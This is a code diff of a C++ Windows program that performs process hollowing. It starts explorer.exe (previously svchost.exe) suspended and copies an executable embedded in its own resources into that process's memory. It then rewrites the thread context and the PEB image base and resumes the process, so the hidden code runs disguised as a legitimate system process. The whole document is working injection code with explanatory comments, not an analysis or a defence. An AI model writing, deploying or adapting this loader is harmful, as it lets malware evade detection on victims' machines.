@@ -2,72 +2,65 @@
 #include "helper.h"
 #include <windows.h>
 #include <wdbgexts.h>
+#include "resource.h"
 
 int main()
 {
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
+	const int baseAddrLength = 4;
+	const int pebImageBaseAddrOffset = 8;
 
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 
-	if (!CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
+	HINSTANCE handleNtDll = LoadLibrary("ntdll");
+
+	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleNtDll, "NtQueryInformationProcess");
+	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
+
+	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
 	{
-		printf("CreateProcess Failed (%d).\n", GetLastError());
+		printf("CreateProcess Failed: %d.\n", GetLastError());
 	}
 
-
-	HINSTANCE handleToRemoteNtDll = LoadLibrary("ntdll");
-
-	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
-	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");
-
-	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
-	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;
 
 
 	PROCESS_BASIC_INFORMATION pbi;
-	PULONG returnLen = NULL;
+
+	/* Retrieves ProcessBasicInformaton info from the created process */
+	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
+
+	/* Retrieves PEB info of the created process */
+	PPEB pPeb = new PEB();
+	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pPeb, sizeof(PEB), 0);
+
+	/* Find and load exe stored in the PE's resource section */
+	HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
+	HGLOBAL resourceData = LoadResource(NULL, resource);
+
+	/* Get pointer to the resource base address */
+	LPVOID lpBaseAddressResource = LockResource(resourceData);
 
 
-	NtQueryInformationProcess(
-		pi.hProcess,
-		ProcessBasicInformation,
-		&pbi,
-		sizeof(pbi),
-		returnLen
-	);
+	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddressResource;
 
-	// GET PEB Info
-	PPEB peb = new PEB();
-	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);
-
-	//ZwUnmapViewOfSection(pi.hProcess, peb->ImageBaseAddress);
-
-
-	HANDLE hFileYo = CreateFileA("C:\\Users\\pip\\Desktop\\yo3.exe", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	HANDLE handleMappingYo = CreateFileMappingA(hFileYo, NULL, PAGE_READWRITE, 0, 0, NULL);
-	LPVOID lpBaseYo = MapViewOfFile(handleMappingYo, FILE_MAP_ALL_ACCESS, 0, 0, 0);
-
-
-	PIMAGE_DOS_HEADER dosHeaderYo = (PIMAGE_DOS_HEADER)lpBaseYo;
-
-	if (dosHeaderYo->e_magic != IMAGE_DOS_SIGNATURE) 
+	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
 	{
-		printf("Failed: .exe does not have a valid signature %i", GetLastError());
+		printf("Failed: .exe does not have a valid DOS signature %i", GetLastError());
 	}
 		
-	PIMAGE_NT_HEADERS pNTHeaderYo = (PIMAGE_NT_HEADERS)((DWORD)dosHeaderYo + (DWORD)dosHeaderYo->e_lfanew);
+	PIMAGE_NT_HEADERS pNTHeaderYo = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);
 
-	LPVOID lpVMem = VirtualAllocEx(pi.hProcess, (LPVOID)pNTHeaderYo->OptionalHeader.ImageBase, pNTHeaderYo->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	
-	BYTE* headerBuffer = new BYTE[pNTHeaderYo->OptionalHeader.SizeOfHeaders];
+	/* Allocate virtual memory for the process which is to be injected */
+	VirtualAllocEx(pi.hProcess, (LPVOID)pNTHeaderYo->OptionalHeader.ImageBase, pNTHeaderYo->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-	memcpy(headerBuffer, dosHeaderYo, pNTHeaderYo->OptionalHeader.SizeOfHeaders);
+	PBYTE pHeaderBuffer = new BYTE[pNTHeaderYo->OptionalHeader.SizeOfHeaders];
 
+	memcpy(pHeaderBuffer, pDosHeader, pNTHeaderYo->OptionalHeader.SizeOfHeaders);
 
-	if (!WriteProcessMemory(pi.hProcess, (LPVOID)pNTHeaderYo->OptionalHeader.ImageBase, headerBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL))
+	if (!WriteProcessMemory(pi.hProcess, (LPVOID)pNTHeaderYo->OptionalHeader.ImageBase, pHeaderBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL))
 	{
 		printf("Failed: Unable to write headers: %i", GetLastError());
 		return -1;
@@ -78,49 +71,42 @@ int main()
 
 	for (int i = 0; i < pNTHeaderYo->FileHeader.NumberOfSections; i++)
 	{
-		BYTE* section = new BYTE[(DWORD)sectionHeader->SizeOfRawData];
-		memcpy(section, (PVOID)((DWORD)dosHeaderYo + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->SizeOfRawData);
-
 		printf("Copying data from: %s\n", sectionHeader->Name);
 
-		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pNTHeaderYo->OptionalHeader.ImageBase + (DWORD)sectionHeader->VirtualAddress), section, (DWORD)sectionHeader->SizeOfRawData, NULL))
+		PBYTE pSectionData = new BYTE[(DWORD)sectionHeader->SizeOfRawData];
+
+		memcpy(pSectionData, (PVOID)((DWORD)pDosHeader + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->SizeOfRawData);
+
+		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pNTHeaderYo->OptionalHeader.ImageBase + (DWORD)sectionHeader->VirtualAddress), pSectionData, (DWORD)sectionHeader->SizeOfRawData, NULL))
 		{
-			printf("Failed: %i", GetLastError());
+			printf("Failed copying data from %s: %i", sectionHeader->Name, GetLastError());
 			return -1;
 		}
 		sectionHeader++;
 	}
 	
-
+	/* Retrieve the suspended procceses current context */
 	PCONTEXT lpContext = new CONTEXT();
 	lpContext->ContextFlags = CONTEXT_FULL;
 	GetThreadContext(pi.hThread, lpContext);
+
+	/* Set the Orginal Entry Point (OEP) value */
 	lpContext->Eax = (DWORD)pNTHeaderYo->OptionalHeader.ImageBase + (DWORD)pNTHeaderYo->OptionalHeader.AddressOfEntryPoint;
 
-	printf("EAX: %x\n", lpContext->Eax);
-	SetThreadContext(
-		pi.hThread,
-		lpContext
-	);
+	/* Set the suspended exe context with the updated eax value which points to the injected code */
+	SetThreadContext(pi.hThread, lpContext);
 
-	WriteProcessMemory(
-		pi.hProcess,
-		(LPVOID)((DWORD)pbi.PebBaseAddress + 8),
-		&pNTHeaderYo->OptionalHeader.ImageBase,
-		4,
-		NULL
-	);
+	/* Overwrite the PEB base address with the image base address of the injected exe */
+	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pbi.PebBaseAddress + pebImageBaseAddrOffset), &pNTHeaderYo->OptionalHeader.ImageBase, baseAddrLength, NULL);
 
-	ResumeThread(
-		pi.hThread
-	);
+	/* Resume the created processes main thread with the updated OEP */
+	ResumeThread(pi.hThread);
 
 
-	printf("Created Process id: %i\n", pi.dwProcessId);
-	printf("Size of Image: %u\n", pNTHeaderYo->OptionalHeader.SizeOfImage);
-	printf("Created Process PebBaseAddress: 0x%x\n", pbi.PebBaseAddress);
-	printf("Created Process Image Base Address %x\n", peb->ImageBaseAddress);
-	printf("Source Base Address %x\n", pNTHeaderYo->OptionalHeader.ImageBase);
+	printf("\nCreated Process id: %i\n", pi.dwProcessId);
+	printf("Created process PebBaseAddress: 0x%x\n", pbi.PebBaseAddress);
+	printf("Created process Image Base Address 0x%x\n", pPeb->ImageBaseAddress);
+	printf("Injected process Image Base Address 0x%x\n", pNTHeaderYo->OptionalHeader.ImageBase);
 
 	return 0;
 }
